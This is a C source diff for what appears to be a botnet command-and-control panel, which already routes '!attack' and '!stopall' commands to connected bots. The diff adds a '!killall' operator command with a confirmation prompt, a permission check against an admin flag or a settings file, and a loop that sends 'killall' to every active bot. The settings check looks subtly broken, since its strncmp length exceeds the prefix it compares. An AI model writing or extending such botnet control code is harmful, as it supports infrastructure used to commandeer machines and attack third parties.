@@ -8,6 +8,9 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <pthread.h>
+#include <strings.h>
+#include <ctype.h>
+#include <sys/socket.h>
 
 #define CYAN "\033[1;36m"
 
@@ -25,6 +28,7 @@ void handle_removeuser_command(const User *user, const char *command, char *resp
 void handle_kickuser_command(const User *user, const char *command, char *response);
 void handle_admin_command(const User *user, char *response);
 void handle_ping_command(char *response);
+void handle_killall_command(const User *user, char *response);
 
 /*
 H E L P   C O M M A N D
@@ -357,6 +361,29 @@ void process_command(const User *user, const char *command, int client_socket, c
         handle_attack_command(user, command, response_buf);
     } else if (strcmp(command, "!stopall") == 0) {
         handle_stopall_command(user, response_buf);
+    } else if (strcmp(command, "!killall") == 0) {
+        snprintf(response_buf, sizeof(response_buf), RED "\rAre you sure you want to disconnect all bots? Type 'yes' to confirm: " RESET);
+        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
+        char confirm_buf[16] = {0};
+        ssize_t confirm_len = recv(client_socket, confirm_buf, sizeof(confirm_buf)-1, 0);
+        if (confirm_len > 0) {
+            confirm_buf[confirm_len] = 0;
+            for (int i = 0; i < confirm_len; i++) {
+                if (confirm_buf[i] == '\r' || confirm_buf[i] == '\n') {
+                    confirm_buf[i] = 0;
+                    break;
+                }
+            }
+            if (strcasecmp(confirm_buf, "yes") == 0) {
+                handle_killall_command(user, response_buf);
+            } else {
+                snprintf(response_buf, sizeof(response_buf), YELLOW "\r!killall command cancelled.\n" RESET);
+            }
+        } else {
+            snprintf(response_buf, sizeof(response_buf), YELLOW "\r!killall command cancelled.\n" RESET);
+        }
+        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
+        return;
     } else {
         snprintf(response_buf, sizeof(response_buf), RED "\rCommand not found\n" RESET);
     }
@@ -978,4 +1005,43 @@ void handle_ping_command(char *response) {
         if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
     }
     pthread_mutex_unlock(&bot_mutex);
+}
+
+void handle_killall_command(const User *user, char *response) {
+    int allow_killall = 0;
+    int killed_count = 0;
+    const char killall_cmd[] = "killall";
+
+    if (user->is_admin) {
+        allow_killall = 1;
+    } else {
+        FILE* sf = fopen("database/settings.txt", "r");
+        if (sf) {
+            char line[128] = {0};
+            while (fgets(line, sizeof(line), sf)) {
+                if (strncmp(line, "globalkillall:", 15) == 0) {
+                    allow_killall = strstr(line, "yes") ? 1 : 0;
+                    break;
+                }
+            }
+            fclose(sf);
+        }
+    }
+
+    if (!allow_killall) {
+        snprintf(response, MAX_COMMAND_LENGTH, "\r" RED "Error: You don't have permission to use !killall\n" RESET);
+        return;
+    }
+
+    pthread_mutex_lock(&bot_mutex);
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].is_valid && bots[i].socket > 0) {
+            if (send(bots[i].socket, killall_cmd, strlen(killall_cmd), MSG_NOSIGNAL) > 0) {
+                killed_count++;
+            }
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+
+    snprintf(response, MAX_COMMAND_LENGTH, "\r" PINK "Sent killall command to %d active bots\n" RESET, killed_count);
 }
